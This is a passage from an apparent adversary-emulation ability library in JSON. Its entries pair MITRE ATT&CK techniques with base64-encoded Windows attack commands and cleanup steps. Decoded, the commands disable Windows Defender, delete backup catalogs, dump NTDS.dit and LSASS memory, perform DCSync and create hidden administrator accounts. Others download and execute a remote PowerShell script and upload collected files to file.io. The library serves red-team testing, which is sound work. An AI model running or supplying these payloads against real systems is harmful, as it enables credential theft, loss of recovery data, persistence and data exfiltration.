excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n", "variations": []}, {"test": "aWYgKEdldC1Db21tYW5kICJTZXQtTVBQcmVmZXJlbmNlIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkgeyAgU2V0LU1QUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAxO30gZWxzZSB7ICAkc2VydmljZSA9IEdldC1TZXJ2aWNlIFdpbkRlZmVuZCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTsgIGlmICgkc2VydmljZSkgeyAgICBpZiAoJHNlcnZpY2UuU3RhdHVzIC1lcSAiUnVubmluZyIpIHsgICAgICBTdG9wLVNlcnZpY2UgV2luRGVmZW5kOyAgICB9ICB9IGVsc2UgeyAgICBlY2hvICJXaW5kb3dzIERlZmVuZGVyIHNlcnZpY2Ugbm90IGZvdW5kLiI7ICAgIGV4aXQgMTsgIH07fTs=", "ability_id": "49470433-30ce-4714-a44b-bea9dbbeca9a", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "Elevated", "technique_id": "T1562.001", "platform": "windows", "name": "Disable Windows Defender Real-Time Protection", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["aWYgKEdldC1Db21tYW5kICJTZXQtTVBQcmVmZXJlbmNlIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkgeyBTZXQtTVBQcmVmZXJlbmNlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nIDA7IH0gZWxzZSB7ICRzZXJ2aWNlID0gR2V0LVNlcnZpY2UgV2luRGVmZW5kIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlOyBpZiAoJHNlcnZpY2UpIHsgU3RhcnQtU2VydmljZSBXaW5EZWZlbmQ7IH0gZWxzZSB7IGVjaG8gIldpbmRvd3MgRGVmZW5kZXIgc2VydmljZSBub3QgZm91bmQuIjsgZXhpdCAxOyB9OyB9Ow=="], "executor": "psh", "access": {}, "description": "Disable Windows Defender Real-Time Protection", "variations": []}, {"test": "d2JhZG1pbiBkZWxldGUgY2F0YWxvZyAtcXVpZXQ=", "ability_id": "9e5e4c0655fd1b5be88bd40b8251175f", "technique_name": "Inhibit System Recovery", "additional_info": {}, "privilege": "", "technique_id": "T1490", "platform": "windows", "name": "Windows - wbadmin Delete Windows Backup Catalog", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,\n\"The backup catalog has been successfully deleted.\" will be displayed in the PowerShell session.\n", "variations": []}, {"test": "Zm9yZmlsZXMgL3AgYzpcd2luZG93c1xzeXN0ZW0zMiAvbSBub3RlcGFkLmV4ZSAvYyBjYWxjLmV4ZQ==", "ability_id": "0e38a868d902804ad6476396b735e152", "technique_name": "Indirect Command Execution", "additional_info": {}, "privilege": "", "technique_id": "T1202", "platform": "windows", "name": "Indirect Command Execution - forfiles.exe", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml)\n\"This is basically saying for each occurrence of notepad.exe in c:\\windows\\system32 run calc.exe\"\nUpon execution calc.exe will be opened.\n", "variations": []}, {"test": "SW52b2tlLUFUSENvbXBpbGVkSGVscCAtU2NyaXB0RW5naW5lIEpTY3JpcHQgLUluZm9UZWNoU3RvcmFnZUhhbmRsZXIgaXRzIC1Ub3BpY0V4dGVuc2lvbiBodG1sIC1ISEZpbGVQYXRoICRlbnY6d2luZGlyXGhoLmV4ZSAtQ0hNRmlsZVBhdGggVGVzdC5jaG0=", "ability_id": "984f60641d35e624e918eb60e2c37734", "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "additional_info": {}, "privilege": "", "technique_id": "T1218.001", "platform": "windows", "name": "Invoke CHM with Script Engine and Help Topic", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes a CHM file with a defined script engine, ITS Protocol Handler, and help topic extension.", "variations": []}, {"test": "Z2V0LXByb2Nlc3MgPj4gJGVudjpBUFBEQVRBXHZtdG9vbHMubG9nO2NhdCAkZW52OkFQUERBVEFcdm10b29scy5sb2c=", "ability_id": "4d9b079c-9ede-4116-8b14-72ad3a5533af", "technique_name": "Process Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1057", "platform": "windows", "name": "PowerShell Process Enumeration", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Capture running processes via PowerShell", "variations": []}, {"test": "aWYgKCEoVGVzdC1QYXRoIEM6XFVzZXJzXFB1YmxpY1xMaWJyYXJpZXNceWFua2kgLVBhdGhUeXBlIENvbnRhaW5lcikpIHs7ICAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1Gb3JjZSAtUGF0aCBDOlxVc2Vyc1xQdWJsaWNcTGlicmFyaWVzXHlhbmtpOyAgICAgfTsgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIiRlbnY6Y29tc3BlYyIgLUFyZ3VtZW50TGlzdCAiL2MsdHlwZSwje3BheWxvYWRfcGF0aH0sPixgIiN7YWRzX2ZpbGVfcGF0aH06I3thZHNfbmFtZX1gIiI=", "ability_id": "b7dd57cb9f71dd5d672ad206e6339033", "technique_name": "Hide Artifacts: NTFS File Attributes", "additional_info": {}, "privilege": "", "technique_id": "T1564.004", "platform": "windows", "name": "Store file in Alternate Data Stream (ADS)", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gIkM6XFVzZXJzXFB1YmxpY1xMaWJyYXJpZXNceWFua2lcZGVza3RvcC5pbmkiIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\nUpon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test\n", "variations": []}, {"test": "MTIwMTFjX0FkRmluZC5leGUgLXNjIGRjbGlzdA==", "ability_id": "ceebaaf57829c53dbfef1fbc785c0b10", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Adfind - Enumerate Active Directory Domain Controller Objects", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["12011c_AdFind.exe"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "variations": []}, {"test": "d21pYyAvTkFNRVNQQUNFOlxccm9vdFxTZWN1cml0eUNlbnRlcjIgUEFUSCBBbnRpVmlydXNQcm9kdWN0IEdFVCAvdmFsdWU=", "ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba", "technique_name": "Software Discovery: Security Software Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1518.001", "platform": "windows", "name": "Discover antivirus programs", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "relationships": [{"edge": "", "source": "host.installed.av", "custom_parser_vals": {}, "target": ""}]}], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Identify AV", "variations": []}, {"test": "b2RiY2NvbmYuZXhlIC9TIC9BIHtSRUdTVlIgIkM6XFVzZXJzXFB1YmxpY1xzYW5kY2F0LmRsbCJ9", "ability_id": "a74bc239-a196-4f7e-8d5c-fe8c0266071c", "technique_name": "Process Injection: Dynamic-link Library Injection", "additional_info": {}, "privilege": "", "technique_id": "T1055.001", "platform": "windows", "name": "Signed Binary Execution - odbcconf", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Leverage odbcconf for DLL injection", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZyk7IEludm9rZS1NYWxkb2MgLW1hY3JvRmlsZSAiUGF0aFRvQXRvbWljc0ZvbGRlclxUMTU1NVxzcmNcVDE1NTUtbWFjcm9jb2RlLnR4dCIgLW9mZmljZVByb2R1Y3QgIldvcmQiIC1zdWIgIkV4dHJhY3Qi", "ability_id": "935e8026584b85192519c57d7080b048", "technique_name": "Credentials from Password Stores", "additional_info": {}, "privilege": "", "technique_id": "T1555", "platform": "windows", "name": "Extract Windows Credential Manager via VBA", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gIiRlbnY6VEVNUFx3aW5kb3dzLWNyZWRlbnRpYWxzLnR4dCIgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "This module will extract the credentials found within the Windows credential manager and dump\nthem to $env:TEMP\\windows-credentials.txt\n", "variations": []}, {"test": "QzpcUFNUb29sc1xQc0V4ZWMuZXhlIFxcbG9jYWxob3N0IC1hY2NlcHRldWxhIC1jIEM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZQ==", "ability_id": "716745153b22c35bf39d177e28ce7bf6", "technique_name": "Remote Services: SMB/Windows Admin Shares", "additional_info": {}, "privilege": "", "technique_id": "T1021.002", "platform": "windows", "name": "Copy and Execute File with PsExec", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n", "variations": []}, {"test": "Y29weSBcXD9cR0xPQkFMUk9PVFxEZXZpY2VcSGFyZGRpc2tWb2x1bWVTaGFkb3dDb3B5MVxXaW5kb3dzXE5URFNcTlREUy5kaXQgQzpcV2luZG93c1xUZW1wXG50ZHMuZGl0ICYmIGNvcHkgXFw/XEdMT0JBTFJPT1RcRGV2aWNlXEhhcmRkaXNrVm9sdW1lU2hhZG93Q29weTFcV2luZG93c1xTeXN0ZW0zMlxjb25maWdcU1lTVEVNIEM6XFdpbmRvd3NcVGVtcFxWU0NfU1lTVEVNX0hJVkUgJiYgcmVnIHNhdmUgSEtMTVxTWVNURU0gQzpcV2luZG93c1xUZW1wXFNZU1RFTV9ISVZF", "ability_id": "bb52768f09251bc7a3d37af1d1a6f895", "technique_name": "OS Credential Dumping: NTDS", "additional_info": {}, "privilege": "", "technique_id": "T1003.003", "platform": "windows", "name": "Copy NTDS.dit from Volume Shadow Copy", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICJDOlxXaW5kb3dzXFRlbXBcbnRkcy5kaXQiICAgICAgICA+bnVsIDI+IG51bCAmJiBkZWwgIkM6XFdpbmRvd3NcVGVtcFxWU0NfU1lTVEVNX0hJVkUiID5udWwgMj4gbnVsICYmIGRlbCAiQzpcV2luZG93c1xUZW1wXFNZU1RFTV9ISVZFIiAgICAgPm51bCAyPiBudWw="], "executor": "cmd", "access": {}, "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with vssadmin\".\nA successful test also requires the export of the SYSTEM Registry hive.\nThis test must be executed on a Windows Domain Controller.\n", "variations": []}, {"test": "c2MuZXhlIGNyZWF0ZSBBdG9taWNUZXN0U2VydmljZV9DTUQgYmluUGF0aD0gNDExZGE1X0F0b21pY1NlcnZpY2UuZXhlICYmIHNjLmV4ZSBzdGFydCBBdG9taWNUZXN0U2VydmljZV9DTUQ=", "ability_id": "fade9013a73781990c2cbfd05de4cd3a", "technique_name": "Create or Modify System Process: Windows Service", "additional_info": {}, "privilege": "", "technique_id": "T1543.003", "platform": "windows", "name": "Service Installation CMD", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["411da5_AtomicService.exe"], "cleanup": ["c2MuZXhlIHN0b3AgQXRvbWljVGVzdFNlcnZpY2VfQ01EID5udWwgMj4mMSAmJiBzYy5leGUgZGVsZXRlIEF0b21pY1Rlc3RTZXJ2aWNlX0NNRCA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Download an executable from github and start it as a service.\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n", "variations": []}, {"test": "R2V0LVNlcnZpY2UgPiAkZW52OlRFTVBcVDExMTlfMS50eHQ7IEdldC1DaGlsZEl0ZW0gRW52OiA+ICRlbnY6VEVNUFxUMTExOV8yLnR4dDsgR2V0LVByb2Nlc3MgPiAkZW52OlRFTVBcVDExMTlfMy50eHQ=", "ability_id": "344e7eaf650763e0d3e9f02e62c1cf4b", "technique_name": "Automated Collection", "additional_info": {}, "privilege": "", "technique_id": "T1119", "platform": "windows", "name": "Recon information for export with PowerShell", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXFQxMTE5XzEudHh0IC1FcnJvckFjdGlvbiBJZ25vcmU7IFJlbW92ZS1JdGVtICRlbnY6VEVNUFxUMTExOV8yLnR4dCAtRXJyb3JBY3Rpb24gSWdub3JlOyBSZW1vdmUtSXRlbSAkZW52OlRFTVBcVDExMTlfMy50eHQgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n", "variations": []}, {"test": "Y3NjcmlwdC5leGUgL2IgQzpcV2luZG93c1xTeXN0ZW0zMlxQcmludGluZ19BZG1pbl9TY3JpcHRzXGVuLVVTXHB1YnBybi52YnMgbG9jYWxob3N0ICJzY3JpcHQ6I3tyZW1vdGVfcGF5bG9hZH0i", "ability_id": "1391d89067fa37461e65eac1bfb55a8b", "technique_name": "Signed Script Proxy Execution: Pubprn", "additional_info": {}, "privilege": "", "technique_id": "T1216.001", "platform": "windows", "name": "PubPrn.vbs Signed Script Bypass", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.\n", "variations": []}, {"test": "cG93ZXJzaGVsbC5leGUgLXZlcnNpb24gMiAtQ29tbWFuZCBXcml0ZS1Ib3N0ICRQU1ZlcnNpb24=", "ability_id": "48a861eb5802bd7abdaa64b4fcd30924", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "PowerShell Downgrade Attack", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This test requires the manual installation of PowerShell V2.\n\nAttempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n", "variations": []}, {"test": "TmV3LUxvY2FsVXNlciAtTmFtZSAiQWRtaW5pc3RyYXRvciAiIC1Ob1Bhc3N3b3Jk", "ability_id": "83a5ad479c9e313e60f34380e193102a", "technique_name": "Hide Artifacts", "additional_info": {}, "privilege": "", "technique_id": "T1564", "platform": "windows", "name": "Create an \"Administrator \" user (with a space on the end)", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUxvY2FsVXNlciAtTmFtZSAiQWRtaW5pc3RyYXRvciAiIDI+JjEgfCBvdXQtbnVsbA=="], "executor": "psh", "access": {}, "description": "Creating a user with a username containing with a space on the end", "variations": []}, {"test": "R2V0LUFET2JqZWN0IC1MREFQRmlsdGVyICcoVXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTUyNDI4OCknIC1TZXJ2ZXIgJGVudjpVc2VyRG5zRG9tYWlu", "ability_id": "b5310f535aaffec42f1902adf1b1270b", "technique_name": "Account Discovery: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.002", "platform": "windows", "name": "Enumerate Active Directory for Unconstrained Delegation", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Attackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n", "variations": []}, {"test": "JXRlbXAlXG5hbm9kdW1wLng2NC5leGUgLXcgIiV0ZW1wJVxuYW5vZHVtcC5kbXAi", "ability_id": "0501437f74ad9350b96fdaf64d0fb6c7", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "", "technique_id": "T1003.001", "platform": "windows", "name": "Dump LSASS.exe Memory using NanoDump", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICIldGVtcCVcbmFub2R1bXAuZG1wIiA+bnVsIDI+IG51bA=="], "executor": "cmd", "access": {}, "description": "The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.\n\nhttps://github.com/helpsystems/nanodump\n\nUpon successful execution, you should find the nanondump.dmp file in the temp directory\n", "variations": []}, {"test": "Q29weS1JdGVtIGQyYTkwMV9qc2VzdGFydHVwLmpzZSAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cFxqc2VzdGFydHVwLmpzZSI7IENvcHktSXRlbSBkMmE5MDFfanNlc3RhcnR1cC5qc2UgIkM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnRVcFxqc2VzdGFydHVwLmpzZSI7IGNzY3JpcHQuZXhlIC9FOkpzY3JpcHQgIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcanNlc3RhcnR1cC5qc2UiOyBjc2NyaXB0LmV4ZSAvRTpKc2NyaXB0ICJDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0VXBcanNlc3RhcnR1cC5qc2Ui", "ability_id": "16e6823c4656f5cd155051f5f1e5d6ad", "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "additional_info": {}, "privilege": "", "technique_id": "T1547.001", "platform": "windows", "name": "Suspicious jse file run from startup Folder", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["d2a901_jsestartup.jse"], "cleanup": ["UmVtb3ZlLUl0ZW0gIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcanNlc3RhcnR1cC5qc2UiIC1FcnJvckFjdGlvbiBJZ25vcmU7IFJlbW92ZS1JdGVtICJDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0VXBcanNlc3RhcnR1cC5qc2UiIC1FcnJvckFjdGlvbiBJZ25vcmU=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJkMmE5MDFfanNlc3RhcnR1cC5qc2Ui"], "executor": "psh", "access": {}, "description": "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n", "variations": []}, {"test": "R2V0LUFEUmVwbEFjY291bnQgLUFsbCAtU2VydmVyICN7bG9nb25zZXJ2ZXJ9", "ability_id": "f7c4d48b7fcd64626488da2a0e8dbcf6", "technique_name": "OS Credential Dumping: DCSync", "additional_info": {}, "privilege": "", "technique_id": "T1003.006", "platform": "windows", "name": "Run DSInternals Get-ADReplAccount", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellerParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n", "variations": []}, {"test": "aW52b2tlLWV4cHJlc3Npb24gJ2NtZCAvYyBzdGFydCBwb3dlcnNoZWxsIC1Db21tYW5kIHtjbWQgL2MgJGVudjp0ZW1wXHRvclxUb3JcdG9yLmV4ZX0nOyBzbGVlcCAtcyA2MDsgc3RvcC1wcm9jZXNzIC1uYW1lICJ0b3IiIHwgb3V0LW51bGw=", "ability_id": "5d2c642587b75f15b6cdf55552aab67a", "technique_name": "Proxy: Multi-hop Proxy", "additional_info": {}, "privilege": "", "technique_id": "T1090.003", "platform": "windows", "name": "Tor Proxy Usage - Windows", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy will be launched, run for 60 seconds, and then exit. \n", "variations": []}, {"test": "Llx3aWZpLnBzMSAtT2Zm", "ability_id": "2fe2d5e6-7b06-4fc0-bf71-6966a1226731", "technique_name": "Endpoint Denial of Service", "additional_info": {}, "privilege": "", "technique_id": "T1499", "platform": "windows", "name": "Disrupt WIFI", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["wifi.ps1"], "cleanup": ["Llx3aWZpLnBzMSAtT24=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJ3aWZpLnBzMSI="], "executor": "psh", "access": {}, "description": "Turn a computers WIFI off", "variations": []}, {"test": "cmVnIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZVwxNi4wXE91dGxvb2tcU2VjdXJpdHlcTGV2ZWwiIC90IFJFR19EV09SRCAvZCAxIC9mICYmIG1rZGlyICAlQVBQREFUQSVcTWljcm9zb2Z0XE91dGxvb2tcID5udWwgMj4mMSAmJiBlY2hvICJBdG9taWMgUmVkIFRlYW0gVEVTVCIgPiAlQVBQREFUQSVcTWljcm9zb2Z0XE91dGxvb2tcVmJhUHJvamVjdC5PVE0=", "ability_id": "12ad9edefc86af07700fbf49bfdac6ba", "technique_name": "Office Application Startup", "additional_info": {}, "privilege": "", "technique_id": "T1137", "platform": "windows", "name": "Office Application Startup - Outlook as a C2", "requirements": [], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZVwxNi4wXE91dGxvb2tcU2VjdXJpdHlcTGV2ZWwiIC9mID5udWwgMj4mMSAmJiBkZWwgJUFQUERBVEElXE1pY3Jvc29mdFxPdXRsb29rXFZiYVByb2plY3QuT1RNID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ \nit is possible to use Outlook Macro as a way to achieve persistance and execute arbitrary commands. This transform Outlook into a C2.\nToo achieve this two things must happened on the syste\n- The macro security registry value must be set to '4'\n- A file called VbaProject.OTM must be created in the Outlook Folder.\n", "variations": []}, {"test": "bmV0IHNoYXJl", "ability_id": "f247309a5f934b32f2e510eb50409d3b", "technique_name": "Network Share Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1135", "platform": "windows", "name": "View available share drives", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session", "variations": []}, {"test": "SW1wb3J0LU1vZHVsZSAuXHBvd2Vydmlldy5wczE7R2V0LU5ldExvY2FsR3JvdXBNZW1iZXIgLUNvbXB1dGVyTmFtZSAje3JlbW90ZS5ob3N0LmZxZG59", "ability_id": "2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "technique_name": "Permission Groups Discovery: Domain Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.002", "platform": "windows", "name": "Discover Domain Admins", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.netlocalgroup", "relationships": [{"edge": "has_admin", "source": "remote.host.fqdn", "custom_parser_vals": {}, "target": "domain.user.name"}]}], "payloads": ["powerview.ps1"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJwb3dlcnZpZXcucHMxIg=="], "executor": "psh", "access": {}, "description": "Use PowerView to query the Active Directory server to determine remote admins", "variations": []}, {"test": "cXVlcnkgdXNlcg==", "ability_id": "8f85d74c3e78c652a9162dcf1296b404", "technique_name": "Account Discovery: Local Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.001", "platform": "windows", "name": "Enumerate logged on users via CMD (Local)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Enumerate logged on users. Upon execution, logged on users will be displayed.\n", "variations": []}, {"test": "bmV0IHVzZXIgJCBBVE9NSUMxMjMhIC9hZGQgL2FjdGl2ZTp5ZXM=", "ability_id": "dedfa0a54c9c13ce5714a0dc2e1f5d1a", "technique_name": "Hide Artifacts", "additional_info": {}, "privilege": "", "technique_id": "T1564", "platform": "windows", "name": "Create a Hidden User Called \"$\"", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0IHVzZXIgJCAvREVMRVRFIDI+JjE="], "executor": "cmd", "access": {}, "description": "Creating a user with a username containing \"$\"", "variations": []}, {"test": "QzpcV2luZG93c1xTeXN0ZW0zMlxDdXJsLmV4ZSAtRiAnZmlsZT1AMzk0NWM5X2FydGlmYWN0JyAtRiAnbWF4RG93bmxvYWRzPTEnIC1GICdhdXRvRGVsZXRlPXRydWUnIGh0dHBzOi8vZmlsZS5pby8=", "ability_id": "db0ad71b6a1fb65edd336bb02c1792ee", "technique_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol", "additional_info": {}, "privilege": "", "technique_id": "T1048.002", "platform": "windows", "name": "Exfiltrate data HTTPS using curl windows", "requirements": [], "tactic": "exfiltration", "buckets": ["exfiltration"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["3945c9_artifact"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Exfiltrate data HTTPS using curl to file share site file.io\n", "variations": []}, {"test": "bWtkaXIgQzpcV2luZG93c1xUZW1wXG50ZHNfVDEwMDMgJiYgbnRkc3V0aWwgImFjIGkgbnRkcyIgImlmbSIgImNyZWF0ZSBmdWxsIEM6XFdpbmRvd3NcVGVtcFxudGRzX1QxMDAzIiBxIHE=", "ability_id": "fefe8d4193bd491f55e9aba273f640d8", "technique_name": 